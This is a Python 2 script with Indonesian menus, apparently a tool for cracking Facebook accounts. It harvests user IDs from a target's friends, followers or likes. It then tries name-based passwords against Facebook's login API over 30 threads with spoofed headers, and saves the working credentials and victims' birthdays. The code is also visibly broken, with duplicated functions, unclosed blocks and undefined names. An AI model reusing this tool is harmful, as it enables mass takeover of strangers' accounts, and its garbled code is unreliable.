#!/usr/bin/python2
# coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib, requests,mechanize,bs4
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser 
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from datetime import datetime
from datetime import date
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 ms062.py")
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from mechanize import Browser 
#-------------------------------------------#
#  my color warna random    #
#-------------------------------------------#
merah = '\033[0;31m'
putih = '\033[0;37m'
hijau = '\033[0;32m'
biru = '\033[0;36m'
ungu = '\033[0;35m'
kuning = '\033[0;33m'
my_color = [
 merah,putih,hijau,biru,ungu, kuning]
warna = random.choice(my_color)
hari = datetime.now().strftime('%A')
def banner():
	print("""
%s ___             _____ _____________________
|   |           /     \\______   \_   _____/
|   |  ______  /  \ /  \|    |  _/|    __)  
|   | /_____/ /    Y    \    |   \|     \   
|___|         \____|__  /______  /\___  /   
                      \/       \/     \/    
"""%(putih))

ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64"}).json()["country_name"].lower()
except:
	ips=None

uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']

try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}
def menu():
	os.system("clear")
	try:
		token = open("iwan_dev","r").read()
	except IOError:
		print("[*] token dan cookies anda telah invalid masukan kembali token dan cookie anda")
		os.system("rm -rf iwan_dev.txt")
		time.sleep(2)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +token)
		a = json.loads(otw.text)
		nami = a['name']
		id = a['id']
	except KeyError:
		os.system("clear")
		print("%s[%s*%s] kesalahan tidak bisa masuka ke dalam menu"%(putih,putih,putih))
		os.system("rm -rf iwan_dev.txt")
		time.sleep(1)
	except requests.exceptions.ConnectionError:
		print("[*] koneksi anda jelek mohon sambungkan kembali koneksi anda")
		os.sys.exit()
	banner()
	print("\n[ selamat datang : %s %s ]"%(kuning,nami))
	print(" ")
	print("%s[01]. crack dari id publik"%(putih))
	print("%s[02]. crack dari followers"%(putih))
	print("%s[03]. crack dari like postingan"%(putih))
	print("%s[04]. get user agent "%(putih))
	print("%s[05]. seting user agent"%(putih))
	print("%s[06]. cek opsi hasil results"%(putih))
	print("%s[07]. lihat hasil results crack"%(putih))
	print("%s[08]. cek informasi facebook"%(putih))
	print("%s[09]. laporkan bug script"%(putih))
	print("%s[10]. update tou script"%(putih))
	print("[%s00%s] logout (hapus akun"%(merah,putih))
	print(" ")
	iwan = raw_input("\n%s[?]. choose : "%(putih))
	if iwan =="":
		print("[!] isi yang benar")
		menu()
	elif iwan =="01" or iwan =="1":
		babaturan()
	elif iwan =="02" or iwan =="2":
		molow()
	elif iwan =="03" or iwan =="3":
		like()
	elif iwan =="04" or iwan =="4":
		get_ugent()
	elif iwan =="05" or iwan =="5":
		set_ua()
	elif iwan =="06" or iwan =="6":
		opsi()
	elif iwan =="07" or iwan =="7":
		results()
	elif iwan =="08" or iwan =="8":
		informasi()
	elif iwan =="09" or iwan =="9":
		lapor()
	elif iwan =="10" or iwan =="10":
		UPDATE()
	elif iwan =="00" or wan =="0":
		os.system("rm -rf iwan_dev.txt")
		print("[√] berhasil menghapus token dan cookie")
	else:
		print("[!] isi yang benar")
		menu()

def babaturan():
	try:
		token = open("login.txt","r").read()
		x = requests.get("https://graph.facebook.com/me?access_token=" + token)
		y = json.loads(x.text)
		n = y['name']
	except (KeyError,IOError):
		print("[*] token dan cookie anda invalid")
		os.system('rm -rf token.txt')
		login()
	except requests.exceptions.ConnectionError:
		print("[*] koneksi anda bermasalah")
		os.system("rm -rf login.txt")
		login()
	try:
		print("[*] ketik 'me' jika ingin crack dari daftar teman")
		idt = raw_input("[*] masukan id atau username : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
		except KeyError:
			print("[*] id yang anda masukan tidak publik")
			menu()
		except requests.exceptions.ConnectionError:
			print("[*] koneksi anda bermasalah")
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?limit=5000&access_token="+token)
		z = json.loads(r.text)
		for i in z['name']['data']:
			id.append(i['id'])
		print("[*] total id -> \033[0;31m" + str(len(id))
		pw(z)
		
def babaturan():
	try:
		token = open("login.txt","r").read()
		x = requests.get("https://graph.facebook.com/me?access_token=" + token)
		y = json.loads(x.text)
		n = y['name']
	except (KeyError,IOError):
		print("[*] token dan cookie anda invalid")
		os.system('rm -rf token.txt')
		login()
	except requests.exceptions.ConnectionError:
		print("[*] koneksi anda bermasalah")
		os.system("rm -rf login.txt")
		login()
	try:
		print("[*] ketik 'me' jika ingin crack dari daftar teman")
		idt = raw_input("[*] masukan id atau username : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
		except KeyError:
			print("[*] id yang anda masukan tidak publik")
			menu()
		except requests.exceptions.ConnectionError:
			print("[*] koneksi anda bermasalah")
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=100000000000000000000&access_token="+token)
		z = json.loads(r.text)
		for i in z['name']['data']:
			id.append(i['id'])
		print("[*] total id -> \033[0;31m" + str(len(id))
		pw(z)

def babaturan():
	try:
		token = open("login.txt","r").read()
		x = requests.get("https://graph.facebook.com/me?access_token=" + token)
		y = json.loads(x.text)
		n = y['name']
	except (KeyError,IOError):
		print("[*] token dan cookie anda invalid")
		os.system('rm -rf token.txt')
		login()
	except requests.exceptions.ConnectionError:
		print("[*] koneksi anda bermasalah")
		os.system("rm -rf login.txt")
		login()
	try:
		print("[*] ketik 'me' jika ingin crack dari daftar teman")
		idt = raw_input("[*] masukan id atau username : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
		except KeyError:
			print("[*] id yang anda masukan tidak publik")
			menu()
		except requests.exceptions.ConnectionError:
			print("[*] koneksi anda bermasalah")
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000000000000000000&access_token="+token)
		z = json.loads(r.text)
		for i in z['name']['data']:
			id.append(i['id'])
		print("[*] total id -> \033[0;31m" + str(len(id))
		pw(z)

def pw(z):
	h = raw_input("\033[0;37m[?] apakah anda ingin menggunakan sandi manual? [Y/t] : ")
	if h =="":
		pw(z)
	elif h =="y" or h =="Y":
		manual(z)
	elif h =="t" or h =="T":
		otomatis(z)
	else:
		print("[!] Pilih Yang Bener")
		pw()

#----->otomatis crack<-----#
def otomatis(file):
	print(" ")
	print("[ pilih methode crack - silahkan coba satu² ]")
	print(" ")
	print("[1] methode api (fast crack)")
	print("[2] methode mbasic (slow crack)")
	print("[3] methode mobile (super slow)")
	print(" ")
	i = raw_input("[?] methode : ")
	if i =="":
		print("[!] isi yang benar")
		pw(z)
	elif i =="01" or i =="1":
		api()
	elif i =="02" or i =="2":
		mbasic()
	elif i =="03" or i =="3":
		mobile()
	else:
		print("[!] isi yang benar")
		otomatis(file)

def api():
	print (' ')
	print('[+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta))
	print('[+] hasil CP disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta))
	print('\n [!] anda bisa menjeda proses crack dengan mematikan data seluler')
	print(' ')
	def main(user):
		try:
			ua = open("ugent.txt", "r").read()
		except IOError:
			ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		global loop, token
		pwx = []
		sys.stdout.write(
		 '\r \033[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		); sys.stdout.flush()
		uid, name = user.split("|")
		if len(name)>=6:
			pwx = [ name, name+"123", name+"1234", name+"12345" ]
		elif len(name)<=2:
			pwx = [ name+"123", name+"1234", name+"12345" ]
		elif len(name)<=3:
			pwx = [ name+"123", name+"12345" ]
		else:
			pwx = [ name+"123", name+"12345" ]
					
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				api = "https://b-api.facebook.com/method/auth.login"
				send = ses.get(api, params=param, headers=headers_) 
				if "session_key" in send.text and "EAAA" in send.text:
					print '\r  \033[1;92m*--> ' +uid+ '|' + pw + '        '
					ok.append(uid+'|'+pw)
					open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
					break
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
					cp.append(uid + '|' + pw)
					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\n\x1b[1;97m [+] crack selesai...'
	exit()
	

if __name__=="__main__":
	login()

	